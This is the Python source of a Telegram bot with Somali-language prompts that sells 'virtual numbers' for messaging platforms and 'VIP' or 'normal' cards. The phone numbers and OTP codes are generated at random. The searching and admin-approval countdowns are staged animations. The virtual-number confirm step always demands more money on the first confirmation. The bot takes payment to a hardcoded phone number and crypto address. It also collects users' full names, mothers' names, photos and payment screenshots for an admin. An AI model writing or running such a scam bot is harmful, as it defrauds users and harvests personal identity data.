import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.client.bot import DefaultBotProperties

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654  # admin id

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="Markdown"))
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}  # storage user info
pending_admin = {}  # pending requests

# ===== STATES =====
class CardState(StatesGroup):
    full_name = State()
    mother_name = State()
    photo = State()
    payment_screenshot = State()

class VirtualState(StatesGroup):
    platform = State()

class CodeState(StatesGroup):
    code = State()

# ===== HELPERS =====
def normal_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4,9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def countdown(msg, text, sec=5):
    for i in range(sec, 0, -1):
        dots = "." * (i % 4)
        await msg.edit_text(f"{text}{dots}\n⏳ {i} sec")
        await asyncio.sleep(1)
    await msg.edit_text(f"{text} Done ✅")

# ===== START =====
@dp.message(Command("start"))
async def start(msg: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton("New Order"), KeyboardButton("Check Code")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖\nDooro mid ka mid ah:", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(F.text == "New Order")
async def new_order(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton("CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data=="virtual")
async def virtual(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WhatsApp", callback_data="v_whatsapp")],
        [InlineKeyboardButton("TikTok", callback_data="v_tiktok")],
        [InlineKeyboardButton("Google", callback_data="v_google")],
        [InlineKeyboardButton("Telegram", callback_data="v_telegram")]
    ])
    await call.message.edit_text("Dooro platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_platform(call: types.CallbackQuery, state:FSMContext):
    platform = call.data.split("_")[1]
    number = normal_number()
    code = generate_code()
    users[call.from_user.id] = {
        "type":"virtual",
        "platform":platform,
        "number":number,
        "code":code
    }
    await call.message.edit_text("OTP Searching...")
    await countdown(call.message,"OTP Searching",5)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="v_pay_local"),
         InlineKeyboardButton("CRYPTO", callback_data="v_pay_crypto")]
    ])
    await call.message.answer("Dooro Payment:", reply_markup=kb)

# ===== CARD =====
@dp.callback_query(F.data=="card")
async def card(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIP - $15", callback_data="vip")],
        [InlineKeyboardButton("NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_type(call: types.CallbackQuery, state:FSMContext):
    number = vip_number() if call.data=="vip" else normal_number()
    users[call.from_user.id] = {
        "type":"card",
        "level":call.data,
        "number":number
    }
    await call.message.answer("Geli Magaca Saddexan:")
    await state.set_state(CardState.full_name)

# ================= VIRTUAL PAYMENTS =================
@dp.callback_query(F.data=="v_pay_local")
async def v_local(call:CallbackQuery):
    user = users[call.from_user.id]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="v_confirm_local"),
         InlineKeyboardButton("CANCEL", callback_data="v_cancel")]
    ])
    await call.message.edit_text(
        f"Numberka Lacagta ku dir:\n+252907868526\n\nDir Lacagta si aad u hesho OTP...",
        reply_markup=kb
    )

@dp.callback_query(F.data=="v_pay_crypto")
async def v_crypto(call:CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("BNB", callback_data="v_bnb"),
         InlineKeyboardButton("USDT-BEP20", callback_data="v_usdt")],
        [InlineKeyboardButton("CANCEL", callback_data="v_cancel")]
    ])
    await call.message.edit_text("Dooro Crypto Adress:", reply_markup=kb)

@dp.callback_query(F.data.in_(["v_bnb","v_usdt"]))
async def v_crypto_address(call:CallbackQuery):
    addr = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="v_confirm_crypto"),
         InlineKeyboardButton("CANCEL", callback_data="v_cancel")]
    ])
    await call.message.edit_text(f"{call.data.split('_')[1]} Adress:\n`{addr}`\nTaabo si uu copy u noqdo", reply_markup=kb)

@dp.callback_query(F.data=="v_confirm_local")
@dp.callback_query(F.data=="v_confirm_crypto")
async def v_confirm_payment(call:CallbackQuery):
    msg = await call.message.edit_text("Payment verifying...")
    # 10 sec admin animation
    await countdown(msg,"Waiting admin approval",10)
    # Haddii admin aan jawaab bixin
    if pending_admin.get(call.from_user.id,True):
        await call.message.answer("PLEASE SEND MONEY 💵")
        pending_admin[call.from_user.id]=False
    else:
        await call.message.answer(f"OTP Code: {users[call.from_user.id]['code']} ✅")

@dp.callback_query(F.data=="v_cancel")
async def v_cancel(call:CallbackQuery):
    await call.message.edit_text("Cancelled ❌")
    if call.from_user.id in users: users.pop(call.from_user.id)

# ================= CARD PAYMENTS =================
@dp.message(CardState.full_name)
async def card_name(msg:types.Message, state:FSMContext):
    users[msg.from_user.id]["name"]=msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother_name)

@dp.message(CardState.mother_name)
async def card_mother(msg:types.Message, state:FSMContext):
    users[msg.from_user.id]["mother_name"]=msg.text
    await msg.answer("Soo dir Sawirkaaga:")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def card_photo(msg:types.Message, state:FSMContext):
    users[msg.from_user.id]["photo"]=msg.photo[-1].file_id
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="c_pay_local"),
         InlineKeyboardButton("CRYPTO", callback_data="c_pay_crypto")]
    ])
    await msg.answer("Dooro Payment Method:", reply_markup=kb)

# Card Local / Crypto
@dp.callback_query(F.data=="c_pay_local")
async def card_local(call:CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="c_confirm_local"),
         InlineKeyboardButton("CANCEL", callback_data="c_cancel")]
    ])
    await call.message.edit_text("Numberka Lacagta ku dir:\n+252907868526", reply_markup=kb)

@dp.callback_query(F.data=="c_pay_crypto")
async def card_crypto(call:CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("BNB", callback_data="c_bnb"),
         InlineKeyboardButton("USDT-BEP20", callback_data="c_usdt")],
        [InlineKeyboardButton("CANCEL", callback_data="c_cancel")]
    ])
    await call.message.edit_text("Dooro Crypto Adress:", reply_markup=kb)

@dp.callback_query(F.data.in_(["c_bnb","c_usdt"]))
async def card_crypto_address(call:CallbackQuery):
    addr = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="c_confirm_crypto"),
         InlineKeyboardButton("CANCEL", callback_data="c_cancel")]
    ])
    await call.message.edit_text(f"{call.data.split('_')[1]} Adress:\n`{addr}`", reply_markup=kb)

# Confirm Screenshot
@dp.callback_query(F.data.in_(["c_confirm_local","c_confirm_crypto"]))
async def card_confirm(call:CallbackQuery, state:FSMContext):
    await call.message.answer("Soo sawir Lacag bixintaada si loo xaqiijiyo:")
    await state.set_state(CardState.payment_screenshot)

@dp.message(CardState.payment_screenshot, F.photo)
async def card_screenshot(msg:types.Message, state:FSMContext):
    users[msg.from_user.id]["screenshot"]=msg.photo[-1].file_id
    user=users[msg.from_user.id]
    user["code"]=generate_code()
    pending_admin[msg.from_user.id]=True
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE",callback_data=f"approve_{msg.from_user.id}"),
         InlineKeyboardButton("REJECT",callback_data=f"reject_{msg.from_user.id}")]
    ])
    await bot.send_photo(
        ADMIN_ID,
        user["screenshot"],
        caption=f"Card Request\nName: {user['name']}\nMother: {user['mother_name']}\nLevel: {user['level']}",
        reply_markup=kb
    )
    await msg.answer("Codsiga waa la diray ⏳")
    await state.clear()

# ================= ADMIN APPROVE/REJECT =================
@dp.callback_query(F.data.startswith("approve_"))
async def admin_approve(call:CallbackQuery):
    uid=int(call.data.split("_")[1])
    user=users[uid]
    pending_admin[uid]=False
    await bot.send_message(uid,f"Approved ✅\nCode: {user['code']}\nGeli CHECK CODE si aad u hesho Numberkaaga")
    await call.message.edit_caption("Approved ✅")

@dp.callback_query(F.data.startswith("reject_"))
async def admin_reject(call:CallbackQuery):
    uid=int(call.data.split("_")[1])
    pending_admin[uid]=False
    await bot.send_message(uid,"Rejected ❌")
    await call.message.edit_caption("Rejected ❌")

# ================= CHECK CODE =================
@dp.message(F.text=="Check Code")
async def check_code(msg:types.Message, state:FSMContext):
    await msg.answer("Geli Code-ka:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def verify_code(msg:types.Message, state:FSMContext):
    data = users.get(msg.from_user.id)
    if data and msg.text==data.get("code"):
        await msg.answer(f"Number-kaaga:\n{data['number']}")
    else:
        await msg.answer("Code khaldan ❌")
    await state.clear()

# ================= CANCEL =================
@dp.callback_query(F.data=="c_cancel")
@dp.callback_query(F.data=="v_cancel")
async def cancel(call:CallbackQuery):
    await call.message.edit_text("Cancelled ❌")
    if call.from_user.id in users: users.pop(call.from_user.id)
    if call.from_user.id in pending_admin: pending_admin.pop(call.from_user.id)

# ================= RUN =================
async def main():
    await dp.start_polling(bot)

if __name__=="__main__":
    import logging
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
